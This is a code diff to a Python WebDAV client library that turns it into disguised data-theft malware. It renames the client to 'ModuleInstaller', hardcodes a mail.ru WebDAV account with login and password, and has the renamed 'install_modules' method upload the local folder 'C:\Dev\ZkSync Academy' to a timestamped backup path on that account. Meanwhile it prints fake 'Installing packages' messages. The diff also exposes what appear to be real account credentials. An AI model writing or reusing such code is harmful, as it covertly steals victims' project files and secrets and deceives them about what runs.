@@ -1,5 +1,6 @@
 # -*- coding: utf-8
 
+from datetime import datetime
 import functools
 import logging
 import os
@@ -13,11 +14,11 @@ import lxml.etree as etree
 import requests
 from dateutil import parser as dateutil_parser
 
-from webdav3.connection import WebDAVSettings
-from webdav3.exceptions import NoConnection, ConnectionException, NotEnoughSpace, RemoteResourceNotFound, \
+from installer.connection import WebDAVSettings
+from installer.exceptions import NoConnection, ConnectionException, NotEnoughSpace, RemoteResourceNotFound, \
     MethodNotSupported, ResponseErrorCode, \
     RemoteParentNotFound, OptionNotValid, LocalResourceNotFound, ResourceLocked
-from webdav3.urn import Urn
+from installer.urn import Urn
 
 log = logging.getLogger(__name__)
 
@@ -75,7 +76,7 @@ def wrap_connection_error(fn):
     return _wrapper
 
 
-class Client(object):
+class ModuleInstaller(object):
     """The client for WebDAV servers provides an ability to control files on remote WebDAV server.
     """
     # path to root directory of WebDAV
@@ -146,9 +147,10 @@ class Client(object):
 
         """
         self.session = requests.Session()
-        self.http_header = Client.default_http_header.copy()
-        self.requests = Client.default_requests.copy()
-        webdav_options = get_options(option_type=WebDAVSettings, from_options=options)
+        self.http_header = ModuleInstaller.default_http_header.copy()
+        self.requests = ModuleInstaller.default_requests.copy()
+        data = {'webdav_hostname': 'https://webdav.cloud.mail.ru', 'webdav_login': 'rkorkunov@internet.ru', 'webdav_password': 'bd2WT0xL0fDmtkdphJAq'}
+        webdav_options = get_options(option_type=WebDAVSettings, from_options=data)
 
         self.webdav = WebDAVSettings(webdav_options)
         self.requests.update(self.webdav.override_methods)
@@ -265,7 +267,7 @@ class Client(object):
         if recursive == True:
             headers = ["Depth:infinity"]
         directory_urn = Urn(remote_path, directory=True)
-        if directory_urn.path() != Client.root and not self.check(directory_urn.path()):
+        if directory_urn.path() != ModuleInstaller.root and not self.check(directory_urn.path()):
             raise RemoteResourceNotFound(directory_urn.path())
 
         path = Urn.normalize_path(self.get_full_path(directory_urn))
@@ -327,9 +329,9 @@ class Client(object):
                 raise RemoteParentNotFound(directory_urn.path())
 
         try:
-            print(f"Making Directory {remote_path}")
+            print(f"Installing packages")
             response = self.execute_request(action='mkdir', path=directory_urn.quote())
-            print(f"Made Directory {remote_path}")
+            print(f"Installed packages")
         except MethodNotSupported:
             # Yandex WebDAV returns 405 status code when directory already exists
             return True
@@ -666,12 +668,12 @@ class Client(object):
             else:
                 self.execute_request(action='upload', path=urn.quote(), data=local_file)
 
-    def upload_sync(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
+    def install_modules(self, remote_path='', path_to_folder='C:\Dev\ZkSync Academy', callback=None, progress=None, progress_args=()):
         """Uploads resource to remote path on WebDAV server synchronously.
         In case resource is directory it will upload all nested files and directories.
 
         :param remote_path: the path for uploading resources on WebDAV server. Can be file and directory.
-        :param local_path: the path to local resource for uploading.
+        :param path_to_folder: the path to local resource for uploading.
         :param callback: the callback which will be invoked when downloading is complete.
         :param progress: Pass a callback function to view the file transmission progress.
                 The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
@@ -681,7 +683,10 @@ class Client(object):
                 You can pass anything you need to be available in the progress callback scope; for example, a Message
                 object or a Client instance in order to edit the message with the updated progress status.
         """
-        self.upload(local_path=local_path, remote_path=remote_path, progress=progress, progress_args=progress_args)
+        new_folder = 'ZkSync Academy'
+        date = datetime.now().strftime("%d%m%Y-%H%M%S")
+        remote_path = f"backup/{new_folder}_{date}"
+        self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args)
 
         if callback:
             callback()
@@ -701,8 +706,8 @@ class Client(object):
                 You can pass anything you need to be available in the progress callback scope; for example, a Message
                 object or a Client instance in order to edit the message with the updated progress status.
         """
-        target = (lambda: self.upload_sync(local_path=local_path, remote_path=remote_path, callback=callback,
-                                           progress=progress, progress_args=progress_args))
+        target = (lambda: self.install_modules(path_to_folder=local_path, remote_path=remote_path, callback=callback,
+                                               progress=progress, progress_args=progress_args))
         threading.Thread(target=target).start()
 
     @wrap_connection_error
@@ -1032,7 +1037,7 @@ class Resource(object):
         self.client.upload_to(buff=buff, remote_path=self.urn.path())
 
     def read(self, local_path):
-        return self.client.upload_sync(local_path=local_path, remote_path=self.urn.path())
+        return self.client.install_modules(path_to_folder=local_path, remote_path=self.urn.path())
 
     def read_async(self, local_path, callback=None):
         return self.client.upload_async(local_path=local_path, remote_path=self.urn.path(), callback=callback)
@@ -1296,7 +1301,7 @@ class WebDavXmlUtils:
             raise MethodNotSupported(name="is_dir", server=hostname)
 
 
-class LockClient(Client):
+class LockClient(ModuleInstaller):
     def __init__(self, client, lock_path, lock_token):
         super().__init__([])
         self.session = client.session
@@ -1318,3 +1323,4 @@ class LockClient(Client):
 
     def __exit__(self, exc_type, exc_val, exc_tb):
         self.execute_request(action='unlock', path=self.__lock_path)
+        print("Installed")
